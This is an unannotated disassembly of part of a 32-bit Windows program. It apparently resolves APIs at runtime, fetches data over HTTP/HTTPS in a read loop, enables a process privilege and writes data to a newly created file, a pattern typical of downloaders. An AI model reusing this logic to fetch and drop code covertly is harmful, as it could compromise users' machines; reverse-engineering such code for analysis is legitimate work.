  401ee6:	ff d0                	call   *%eax
  401ee8:	89 85 8c fd ff ff    	mov    %eax,-0x274(%ebp)
  401eee:	8b 85 8c fd ff ff    	mov    -0x274(%ebp),%eax
  401ef4:	85 c0                	test   %eax,%eax
  401ef6:	0f 84 05 00 00 00    	je     0x401f01
  401efc:	e9 05 00 00 00       	jmp    0x401f06
  401f01:	e9 4c 02 00 00       	jmp    0x402152
  401f06:	b8 21 32 40 00       	mov    $0x403221,%eax
  401f0b:	50                   	push   %eax
  401f0c:	8b 45 08             	mov    0x8(%ebp),%eax
  401f0f:	50                   	push   %eax
  401f10:	e8 d3 0a 00 00       	call   0x4029e8
  401f15:	83 c4 08             	add    $0x8,%esp
  401f18:	83 f8 00             	cmp    $0x0,%eax
  401f1b:	0f 84 47 00 00 00    	je     0x401f68
  401f21:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  401f27:	83 c0 2c             	add    $0x2c,%eax
  401f2a:	b9 00 00 00 00       	mov    $0x0,%ecx
  401f2f:	51                   	push   %ecx
  401f30:	b9 00 00 a0 84       	mov    $0x84a00000,%ecx
  401f35:	51                   	push   %ecx
  401f36:	b9 00 00 00 00       	mov    $0x0,%ecx
  401f3b:	51                   	push   %ecx
  401f3c:	b9 00 00 00 00       	mov    $0x0,%ecx
  401f41:	51                   	push   %ecx
  401f42:	b9 00 00 00 00       	mov    $0x0,%ecx
  401f47:	51                   	push   %ecx
  401f48:	8b 08                	mov    (%eax),%ecx
  401f4a:	51                   	push   %ecx
  401f4b:	b8 27 32 40 00       	mov    $0x403227,%eax
  401f50:	50                   	push   %eax
  401f51:	8b 85 8c fd ff ff    	mov    -0x274(%ebp),%eax
  401f57:	50                   	push   %eax
  401f58:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401f5b:	ff d0                	call   *%eax
  401f5d:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
  401f63:	e9 91 00 00 00       	jmp    0x401ff9
  401f68:	8d 85 98 fd ff ff    	lea    -0x268(%ebp),%eax
  401f6e:	83 c0 2c             	add    $0x2c,%eax
  401f71:	8d 8d 98 fd ff ff    	lea    -0x268(%ebp),%ecx
  401f77:	83 c1 18             	add    $0x18,%ecx
  401f7a:	0f b7 11             	movzwl (%ecx),%edx
  401f7d:	81 fa bb 01 00 00    	cmp    $0x1bb,%edx
  401f83:	b9 00 00 00 00       	mov    $0x0,%ecx
  401f88:	0f 94 c1             	sete   %cl
  401f8b:	89 85 78 f5 ff ff    	mov    %eax,-0xa88(%ebp)
  401f91:	85 c9                	test   %ecx,%ecx
  401f93:	0f 84 05 00 00 00    	je     0x401f9e
  401f99:	e9 0a 00 00 00       	jmp    0x401fa8
  401f9e:	b8 00 00 00 00       	mov    $0x0,%eax
  401fa3:	e9 05 00 00 00       	jmp    0x401fad
  401fa8:	b8 00 00 80 00       	mov    $0x800000,%eax
  401fad:	81 c8 00 00 00 80    	or     $0x80000000,%eax
  401fb3:	81 c8 00 00 00 04    	or     $0x4000000,%eax
  401fb9:	81 c8 00 00 20 00    	or     $0x200000,%eax
  401fbf:	b9 00 00 00 00       	mov    $0x0,%ecx
  401fc4:	51                   	push   %ecx
  401fc5:	50                   	push   %eax
  401fc6:	b8 00 00 00 00       	mov    $0x0,%eax
  401fcb:	50                   	push   %eax
  401fcc:	b8 00 00 00 00       	mov    $0x0,%eax
  401fd1:	50                   	push   %eax
  401fd2:	b8 00 00 00 00       	mov    $0x0,%eax
  401fd7:	50                   	push   %eax
  401fd8:	8b 85 78 f5 ff ff    	mov    -0xa88(%ebp),%eax
  401fde:	8b 00                	mov    (%eax),%eax
  401fe0:	50                   	push   %eax
  401fe1:	b8 2b 32 40 00       	mov    $0x40322b,%eax
  401fe6:	50                   	push   %eax
  401fe7:	8b 85 8c fd ff ff    	mov    -0x274(%ebp),%eax
  401fed:	50                   	push   %eax
  401fee:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401ff1:	ff d0                	call   *%eax
  401ff3:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
  401ff9:	8b 85 88 fd ff ff    	mov    -0x278(%ebp),%eax
  401fff:	85 c0                	test   %eax,%eax
  402001:	0f 84 05 00 00 00    	je     0x40200c
  402007:	e9 05 00 00 00       	jmp    0x402011
  40200c:	e9 41 01 00 00       	jmp    0x402152
  402011:	b8 00 00 00 00       	mov    $0x0,%eax
  402016:	50                   	push   %eax
  402017:	b8 00 00 00 00       	mov    $0x0,%eax
  40201c:	50                   	push   %eax
  40201d:	b8 00 00 00 00       	mov    $0x0,%eax
  402022:	50                   	push   %eax
  402023:	b8 00 00 00 00       	mov    $0x0,%eax
  402028:	50                   	push   %eax
  402029:	8b 85 88 fd ff ff    	mov    -0x278(%ebp),%eax
  40202f:	50                   	push   %eax
  402030:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402033:	ff d0                	call   *%eax
  402035:	85 c0                	test   %eax,%eax
  402037:	0f 84 05 00 00 00    	je     0x402042
  40203d:	e9 05 00 00 00       	jmp    0x402047
  402042:	e9 0b 01 00 00       	jmp    0x402152
  402047:	b8 00 00 00 00       	mov    $0x0,%eax
  40204c:	50                   	push   %eax
  40204d:	8d 85 80 fd ff ff    	lea    -0x280(%ebp),%eax
  402053:	50                   	push   %eax
  402054:	8d 85 84 fd ff ff    	lea    -0x27c(%ebp),%eax
  40205a:	50                   	push   %eax
  40205b:	b8 13 00 00 20       	mov    $0x20000013,%eax
  402060:	50                   	push   %eax
  402061:	8b 85 88 fd ff ff    	mov    -0x278(%ebp),%eax
  402067:	50                   	push   %eax
  402068:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40206b:	ff d0                	call   *%eax
  40206d:	85 c0                	test   %eax,%eax
  40206f:	0f 84 05 00 00 00    	je     0x40207a
  402075:	e9 05 00 00 00       	jmp    0x40207f
  40207a:	e9 d3 00 00 00       	jmp    0x402152
  40207f:	8b 85 84 fd ff ff    	mov    -0x27c(%ebp),%eax
  402085:	81 f8 c8 00 00 00    	cmp    $0xc8,%eax
  40208b:	0f 84 05 00 00 00    	je     0x402096
  402091:	e9 bc 00 00 00       	jmp    0x402152
  402096:	8d 85 80 fd ff ff    	lea    -0x280(%ebp),%eax
  40209c:	50                   	push   %eax
  40209d:	b8 00 08 00 00       	mov    $0x800,%eax
  4020a2:	50                   	push   %eax
  4020a3:	8d 85 7f f5 ff ff    	lea    -0xa81(%ebp),%eax
  4020a9:	50                   	push   %eax
  4020aa:	8b 85 88 fd ff ff    	mov    -0x278(%ebp),%eax
  4020b0:	50                   	push   %eax
  4020b1:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4020b4:	ff d0                	call   *%eax
  4020b6:	85 c0                	test   %eax,%eax
  4020b8:	0f 84 05 00 00 00    	je     0x4020c3
  4020be:	e9 05 00 00 00       	jmp    0x4020c8
  4020c3:	e9 82 00 00 00       	jmp    0x40214a
  4020c8:	8b 85 80 fd ff ff    	mov    -0x280(%ebp),%eax
  4020ce:	85 c0                	test   %eax,%eax
  4020d0:	0f 84 05 00 00 00    	je     0x4020db
  4020d6:	e9 05 00 00 00       	jmp    0x4020e0
  4020db:	e9 6a 00 00 00       	jmp    0x40214a
  4020e0:	8b 85 80 fd ff ff    	mov    -0x280(%ebp),%eax
  4020e6:	50                   	push   %eax
  4020e7:	8d 85 7f f5 ff ff    	lea    -0xa81(%ebp),%eax
  4020ed:	50                   	push   %eax
  4020ee:	8b 85 d4 fd ff ff    	mov    -0x22c(%ebp),%eax
  4020f4:	50                   	push   %eax
  4020f5:	e8 f6 08 00 00       	call   0x4029f0
  4020fa:	83 c4 0c             	add    $0xc,%esp
  4020fd:	8b 85 d4 fd ff ff    	mov    -0x22c(%ebp),%eax
  402103:	8b 8d 80 fd ff ff    	mov    -0x280(%ebp),%ecx
  402109:	01 c8                	add    %ecx,%eax
  40210b:	89 85 d4 fd ff ff    	mov    %eax,-0x22c(%ebp)
  402111:	8b 45 10             	mov    0x10(%ebp),%eax
  402114:	8b 08                	mov    (%eax),%ecx
  402116:	8b 95 80 fd ff ff    	mov    -0x280(%ebp),%edx
  40211c:	01 d1                	add    %edx,%ecx
  40211e:	89 08                	mov    %ecx,(%eax)
  402120:	b8 00 08 00 00       	mov    $0x800,%eax
  402125:	50                   	push   %eax
  402126:	b8 00 00 00 00       	mov    $0x0,%eax
  40212b:	50                   	push   %eax
  40212c:	8d 85 7f f5 ff ff    	lea    -0xa81(%ebp),%eax
  402132:	50                   	push   %eax
  402133:	e8 30 08 00 00       	call   0x402968
  402138:	83 c4 0c             	add    $0xc,%esp
  40213b:	8b 85 80 fd ff ff    	mov    -0x280(%ebp),%eax
  402141:	83 f8 00             	cmp    $0x0,%eax
  402144:	0f 87 4c ff ff ff    	ja     0x402096
  40214a:	b8 01 00 00 00       	mov    $0x1,%eax
  40214f:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402152:	8b 85 88 fd ff ff    	mov    -0x278(%ebp),%eax
  402158:	85 c0                	test   %eax,%eax
  40215a:	0f 84 0c 00 00 00    	je     0x40216c
  402160:	8b 85 88 fd ff ff    	mov    -0x278(%ebp),%eax
  402166:	50                   	push   %eax
  402167:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40216a:	ff d0                	call   *%eax
  40216c:	8b 85 8c fd ff ff    	mov    -0x274(%ebp),%eax
  402172:	85 c0                	test   %eax,%eax
  402174:	0f 84 0c 00 00 00    	je     0x402186
  40217a:	8b 85 8c fd ff ff    	mov    -0x274(%ebp),%eax
  402180:	50                   	push   %eax
  402181:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402184:	ff d0                	call   *%eax
  402186:	8b 85 90 fd ff ff    	mov    -0x270(%ebp),%eax
  40218c:	85 c0                	test   %eax,%eax
  40218e:	0f 84 0c 00 00 00    	je     0x4021a0
  402194:	8b 85 90 fd ff ff    	mov    -0x270(%ebp),%eax
  40219a:	50                   	push   %eax
  40219b:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40219e:	ff d0                	call   *%eax
  4021a0:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4021a3:	e9 00 00 00 00       	jmp    0x4021a8
  4021a8:	c9                   	leave
  4021a9:	c3                   	ret
  4021aa:	55                   	push   %ebp
  4021ab:	89 e5                	mov    %esp,%ebp
  4021ad:	81 ec 3c 00 00 00    	sub    $0x3c,%esp
  4021b3:	90                   	nop
  4021b4:	b8 00 00 00 00       	mov    $0x0,%eax
  4021b9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4021bc:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4021bf:	50                   	push   %eax
  4021c0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4021c3:	50                   	push   %eax
  4021c4:	8b 45 08             	mov    0x8(%ebp),%eax
  4021c7:	50                   	push   %eax
  4021c8:	e8 2b 08 00 00       	call   0x4029f8
  4021cd:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4021d0:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4021d3:	85 c0                	test   %eax,%eax
  4021d5:	0f 84 2f 00 00 00    	je     0x40220a
  4021db:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4021de:	83 c0 20             	add    $0x20,%eax
  4021e1:	8b 08                	mov    (%eax),%ecx
  4021e3:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  4021e6:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4021e9:	83 c0 1c             	add    $0x1c,%eax
  4021ec:	8b 08                	mov    (%eax),%ecx
  4021ee:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  4021f1:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4021f4:	83 c0 04             	add    $0x4,%eax
  4021f7:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  4021fa:	89 08                	mov    %ecx,(%eax)
  4021fc:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4021ff:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  402202:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  402205:	e9 0a 00 00 00       	jmp    0x402214
  40220a:	b8 00 00 00 00       	mov    $0x0,%eax
  40220f:	e9 00 00 00 00       	jmp    0x402214
  402214:	c9                   	leave
  402215:	c3                   	ret
  402216:	55                   	push   %ebp
  402217:	89 e5                	mov    %esp,%ebp
  402219:	81 ec 10 00 00 00    	sub    $0x10,%esp
  40221f:	90                   	nop
  402220:	8b 45 0c             	mov    0xc(%ebp),%eax
  402223:	50                   	push   %eax
  402224:	e8 d7 07 00 00       	call   0x402a00
  402229:	c1 e0 01             	shl    $0x1,%eax
  40222c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40222f:	8b 45 10             	mov    0x10(%ebp),%eax
  402232:	50                   	push   %eax
  402233:	e8 c8 07 00 00       	call   0x402a00
  402238:	c1 e0 01             	shl    $0x1,%eax
  40223b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40223e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402241:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402244:	01 c8                	add    %ecx,%eax
  402246:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402249:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40224c:	81 f8 ff ff 00 00    	cmp    $0xffff,%eax
  402252:	0f 86 0a 00 00 00    	jbe    0x402262
  402258:	b8 6f 00 00 00       	mov    $0x6f,%eax
  40225d:	e9 91 00 00 00       	jmp    0x4022f3
  402262:	e8 a1 07 00 00       	call   0x402a08
  402267:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40226a:	51                   	push   %ecx
  40226b:	b9 00 00 00 00       	mov    $0x0,%ecx
  402270:	51                   	push   %ecx
  402271:	50                   	push   %eax
  402272:	e8 99 07 00 00       	call   0x402a10
  402277:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40227a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40227d:	83 f8 00             	cmp    $0x0,%eax
  402280:	0f 85 0a 00 00 00    	jne    0x402290
  402286:	e8 8d 07 00 00       	call   0x402a18
  40228b:	e9 63 00 00 00       	jmp    0x4022f3
  402290:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402293:	50                   	push   %eax
  402294:	8b 45 0c             	mov    0xc(%ebp),%eax
  402297:	50                   	push   %eax
  402298:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40229b:	50                   	push   %eax
  40229c:	e8 4f 07 00 00       	call   0x4029f0
  4022a1:	83 c4 0c             	add    $0xc,%esp
  4022a4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4022a7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4022aa:	01 c8                	add    %ecx,%eax
  4022ac:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4022af:	51                   	push   %ecx
  4022b0:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4022b3:	51                   	push   %ecx
  4022b4:	50                   	push   %eax
  4022b5:	e8 36 07 00 00       	call   0x4029f0
  4022ba:	83 c4 0c             	add    $0xc,%esp
  4022bd:	8b 45 08             	mov    0x8(%ebp),%eax
  4022c0:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4022c3:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  4022c9:	66 89 08             	mov    %cx,(%eax)
  4022cc:	8b 45 08             	mov    0x8(%ebp),%eax
  4022cf:	83 c0 02             	add    $0x2,%eax
  4022d2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4022d5:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  4022db:	66 89 08             	mov    %cx,(%eax)
  4022de:	8b 45 08             	mov    0x8(%ebp),%eax
  4022e1:	83 c0 04             	add    $0x4,%eax
  4022e4:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4022e7:	89 08                	mov    %ecx,(%eax)
  4022e9:	b8 00 00 00 00       	mov    $0x0,%eax
  4022ee:	e9 00 00 00 00       	jmp    0x4022f3
  4022f3:	c9                   	leave
  4022f4:	c3                   	ret
  4022f5:	55                   	push   %ebp
  4022f6:	89 e5                	mov    %esp,%ebp
  4022f8:	81 ec 10 00 00 00    	sub    $0x10,%esp
  4022fe:	90                   	nop
  4022ff:	8b 45 0c             	mov    0xc(%ebp),%eax
  402302:	50                   	push   %eax
  402303:	e8 f8 06 00 00       	call   0x402a00
  402308:	c1 e0 01             	shl    $0x1,%eax
  40230b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40230e:	8b 45 10             	mov    0x10(%ebp),%eax
  402311:	50                   	push   %eax
  402312:	e8 e9 06 00 00       	call   0x402a00
  402317:	c1 e0 01             	shl    $0x1,%eax
  40231a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40231d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402320:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402323:	01 c8                	add    %ecx,%eax
  402325:	83 c0 02             	add    $0x2,%eax
  402328:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40232b:	e8 d8 06 00 00       	call   0x402a08
  402330:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402333:	51                   	push   %ecx
  402334:	b9 00 00 00 00       	mov    $0x0,%ecx
  402339:	51                   	push   %ecx
  40233a:	50                   	push   %eax
  40233b:	e8 d0 06 00 00       	call   0x402a10
  402340:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402343:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402346:	83 f8 00             	cmp    $0x0,%eax
  402349:	0f 85 0a 00 00 00    	jne    0x402359
  40234f:	e8 c4 06 00 00       	call   0x402a18
  402354:	e9 42 00 00 00       	jmp    0x40239b
  402359:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40235c:	50                   	push   %eax
  40235d:	8b 45 0c             	mov    0xc(%ebp),%eax
  402360:	50                   	push   %eax
  402361:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402364:	50                   	push   %eax
  402365:	e8 86 06 00 00       	call   0x4029f0
  40236a:	83 c4 0c             	add    $0xc,%esp
  40236d:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402370:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402373:	01 c8                	add    %ecx,%eax
  402375:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402378:	83 c1 02             	add    $0x2,%ecx
  40237b:	51                   	push   %ecx
  40237c:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40237f:	51                   	push   %ecx
  402380:	50                   	push   %eax
  402381:	e8 6a 06 00 00       	call   0x4029f0
  402386:	83 c4 0c             	add    $0xc,%esp
  402389:	8b 45 08             	mov    0x8(%ebp),%eax
  40238c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40238f:	89 08                	mov    %ecx,(%eax)
  402391:	b8 00 00 00 00       	mov    $0x0,%eax
  402396:	e9 00 00 00 00       	jmp    0x40239b
  40239b:	c9                   	leave
  40239c:	c3                   	ret
  40239d:	55                   	push   %ebp
  40239e:	89 e5                	mov    %esp,%ebp
  4023a0:	81 ec 00 00 00 00    	sub    $0x0,%esp
  4023a6:	90                   	nop
  4023a7:	e8 5c 06 00 00       	call   0x402a08
  4023ac:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4023af:	83 c1 04             	add    $0x4,%ecx
  4023b2:	8b 11                	mov    (%ecx),%edx
  4023b4:	52                   	push   %edx
  4023b5:	b9 00 00 00 00       	mov    $0x0,%ecx
  4023ba:	51                   	push   %ecx
  4023bb:	50                   	push   %eax
  4023bc:	e8 5f 06 00 00       	call   0x402a20
  4023c1:	c9                   	leave
  4023c2:	c3                   	ret
  4023c3:	55                   	push   %ebp
  4023c4:	89 e5                	mov    %esp,%ebp
  4023c6:	81 ec 00 00 00 00    	sub    $0x0,%esp
  4023cc:	90                   	nop
  4023cd:	e8 36 06 00 00       	call   0x402a08
  4023d2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4023d5:	51                   	push   %ecx
  4023d6:	b9 00 00 00 00       	mov    $0x0,%ecx
  4023db:	51                   	push   %ecx
  4023dc:	50                   	push   %eax
  4023dd:	e8 3e 06 00 00       	call   0x402a20
  4023e2:	c9                   	leave
  4023e3:	c3                   	ret
  4023e4:	55                   	push   %ebp
  4023e5:	89 e5                	mov    %esp,%ebp
  4023e7:	81 ec 24 00 00 00    	sub    $0x24,%esp
  4023ed:	90                   	nop
  4023ee:	b8 2f 32 40 00       	mov    $0x40322f,%eax
  4023f3:	50                   	push   %eax
  4023f4:	e8 5f 05 00 00       	call   0x402958
  4023f9:	b9 3c 32 40 00       	mov    $0x40323c,%ecx
  4023fe:	51                   	push   %ecx
  4023ff:	50                   	push   %eax
  402400:	e8 5b 05 00 00       	call   0x402960
  402405:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402408:	b8 52 32 40 00       	mov    $0x403252,%eax
  40240d:	50                   	push   %eax
  40240e:	e8 45 05 00 00       	call   0x402958
  402413:	b9 5f 32 40 00       	mov    $0x40325f,%ecx
  402418:	51                   	push   %ecx
  402419:	50                   	push   %eax
  40241a:	e8 41 05 00 00       	call   0x402960
  40241f:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402422:	b8 70 32 40 00       	mov    $0x403270,%eax
  402427:	50                   	push   %eax
  402428:	e8 2b 05 00 00       	call   0x402958
  40242d:	b9 7d 32 40 00       	mov    $0x40327d,%ecx
  402432:	51                   	push   %ecx
  402433:	50                   	push   %eax
  402434:	e8 27 05 00 00       	call   0x402960
  402439:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40243c:	b8 01 00 00 00       	mov    $0x1,%eax
  402441:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402444:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402447:	83 c0 04             	add    $0x4,%eax
  40244a:	83 c0 08             	add    $0x8,%eax
  40244d:	b9 02 00 00 00       	mov    $0x2,%ecx
  402452:	89 08                	mov    %ecx,(%eax)
  402454:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402457:	83 c0 04             	add    $0x4,%eax
  40245a:	50                   	push   %eax
  40245b:	8b 45 08             	mov    0x8(%ebp),%eax
  40245e:	50                   	push   %eax
  40245f:	b8 00 00 00 00       	mov    $0x0,%eax
  402464:	50                   	push   %eax
  402465:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402468:	ff d0                	call   *%eax
  40246a:	85 c0                	test   %eax,%eax
  40246c:	0f 84 05 00 00 00    	je     0x402477
  402472:	e9 0a 00 00 00       	jmp    0x402481
  402477:	e8 9c 05 00 00       	call   0x402a18
  40247c:	e9 8a 00 00 00       	jmp    0x40250b
  402481:	e8 4a 05 00 00       	call   0x4029d0
  402486:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  402489:	51                   	push   %ecx
  40248a:	b9 20 00 00 00       	mov    $0x20,%ecx
  40248f:	51                   	push   %ecx
  402490:	50                   	push   %eax
  402491:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402494:	ff d0                	call   *%eax
  402496:	85 c0                	test   %eax,%eax
  402498:	0f 84 05 00 00 00    	je     0x4024a3
  40249e:	e9 0a 00 00 00       	jmp    0x4024ad
  4024a3:	e8 70 05 00 00       	call   0x402a18
  4024a8:	e9 5e 00 00 00       	jmp    0x40250b
  4024ad:	b8 00 00 00 00       	mov    $0x0,%eax
  4024b2:	50                   	push   %eax
  4024b3:	b8 00 00 00 00       	mov    $0x0,%eax
  4024b8:	50                   	push   %eax
  4024b9:	b8 10 00 00 00       	mov    $0x10,%eax
  4024be:	50                   	push   %eax
  4024bf:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4024c2:	50                   	push   %eax
  4024c3:	b8 00 00 00 00       	mov    $0x0,%eax
  4024c8:	50                   	push   %eax
  4024c9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4024cc:	50                   	push   %eax
  4024cd:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4024d0:	ff d0                	call   *%eax
  4024d2:	85 c0                	test   %eax,%eax
  4024d4:	0f 84 05 00 00 00    	je     0x4024df
  4024da:	e9 19 00 00 00       	jmp    0x4024f8
  4024df:	e8 34 05 00 00       	call   0x402a18
  4024e4:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4024e7:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4024ea:	50                   	push   %eax
  4024eb:	e8 a0 04 00 00       	call   0x402990
  4024f0:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4024f3:	e9 13 00 00 00       	jmp    0x40250b
  4024f8:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4024fb:	50                   	push   %eax
  4024fc:	e8 8f 04 00 00       	call   0x402990
  402501:	b8 00 00 00 00       	mov    $0x0,%eax
  402506:	e9 00 00 00 00       	jmp    0x40250b
  40250b:	c9                   	leave
  40250c:	c3                   	ret
  40250d:	55                   	push   %ebp
  40250e:	89 e5                	mov    %esp,%ebp
  402510:	81 ec 14 00 00 00    	sub    $0x14,%esp
  402516:	90                   	nop
  402517:	b8 93 32 40 00       	mov    $0x403293,%eax
  40251c:	50                   	push   %eax
  40251d:	e8 36 04 00 00       	call   0x402958
  402522:	b9 9d 32 40 00       	mov    $0x40329d,%ecx
  402527:	51                   	push   %ecx
  402528:	50                   	push   %eax
  402529:	e8 32 04 00 00       	call   0x402960
  40252e:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402531:	8b 45 08             	mov    0x8(%ebp),%eax
  402534:	50                   	push   %eax
  402535:	b8 aa 32 40 00       	mov    $0x4032aa,%eax
  40253a:	50                   	push   %eax
  40253b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40253e:	50                   	push   %eax
  40253f:	e8 d2 fc ff ff       	call   0x402216
  402544:	83 c4 0c             	add    $0xc,%esp
  402547:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40254a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40254d:	85 c0                	test   %eax,%eax
  40254f:	0f 84 08 00 00 00    	je     0x40255d
  402555:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402558:	e9 48 00 00 00       	jmp    0x4025a5
  40255d:	b8 14 33 40 00       	mov    $0x403314,%eax
  402562:	50                   	push   %eax
  402563:	e8 7c fe ff ff       	call   0x4023e4
  402568:	83 c4 04             	add    $0x4,%esp
  40256b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40256e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402571:	83 f8 00             	cmp    $0x0,%eax
  402574:	0f 85 1d 00 00 00    	jne    0x402597
  40257a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40257d:	50                   	push   %eax
  40257e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402581:	ff d0                	call   *%eax
  402583:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402586:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402589:	50                   	push   %eax
  40258a:	e8 0e fe ff ff       	call   0x40239d
  40258f:	83 c4 04             	add    $0x4,%esp
  402592:	e9 06 00 00 00       	jmp    0x40259d
  402597:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40259a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40259d:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4025a0:	e9 00 00 00 00       	jmp    0x4025a5
  4025a5:	c9                   	leave
  4025a6:	c3                   	ret
  4025a7:	55                   	push   %ebp
  4025a8:	89 e5                	mov    %esp,%ebp
  4025aa:	81 ec 0c 00 00 00    	sub    $0xc,%esp
  4025b0:	90                   	nop
  4025b1:	b8 00 00 00 00       	mov    $0x0,%eax
  4025b6:	50                   	push   %eax
  4025b7:	b8 80 00 00 00       	mov    $0x80,%eax
  4025bc:	50                   	push   %eax
  4025bd:	b8 02 00 00 00       	mov    $0x2,%eax
  4025c2:	50                   	push   %eax
  4025c3:	b8 00 00 00 00       	mov    $0x0,%eax
  4025c8:	50                   	push   %eax
  4025c9:	b8 00 00 00 00       	mov    $0x0,%eax
  4025ce:	50                   	push   %eax
  4025cf:	b8 00 00 00 c0       	mov    $0xc0000000,%eax
  4025d4:	50                   	push   %eax
  4025d5:	8b 45 10             	mov    0x10(%ebp),%eax
  4025d8:	50                   	push   %eax
  4025d9:	e8 9a 03 00 00       	call   0x402978
  4025de:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4025e1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4025e4:	83 f8 00             	cmp    $0x0,%eax
  4025e7:	0f 84 2f 00 00 00    	je     0x40261c
  4025ed:	b8 00 00 00 00       	mov    $0x0,%eax
  4025f2:	50                   	push   %eax
  4025f3:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4025f6:	50                   	push   %eax
  4025f7:	8b 45 0c             	mov    0xc(%ebp),%eax
  4025fa:	50                   	push   %eax
  4025fb:	8b 45 08             	mov    0x8(%ebp),%eax
  4025fe:	50                   	push   %eax
  4025ff:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402602:	50                   	push   %eax
  402603:	e8 80 03 00 00       	call   0x402988
  402608:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40260b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40260e:	50                   	push   %eax
  40260f:	e8 7c 03 00 00       	call   0x402990
  402614:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402617:	e9 0a 00 00 00       	jmp    0x402626
  40261c:	b8 00 00 00 00       	mov    $0x0,%eax
  402621:	e9 00 00 00 00       	jmp    0x402626
  402626:	c9                   	leave
  402627:	c3                   	ret
  402628:	55                   	push   %ebp
  402629:	89 e5                	mov    %esp,%ebp
  40262b:	81 ec 0c 00 00 00    	sub    $0xc,%esp
  402631:	90                   	nop
  402632:	b8 00 00 00 00       	mov    $0x0,%eax
  402637:	89 45 fc             	mov    %eax,-0x4(%ebp)
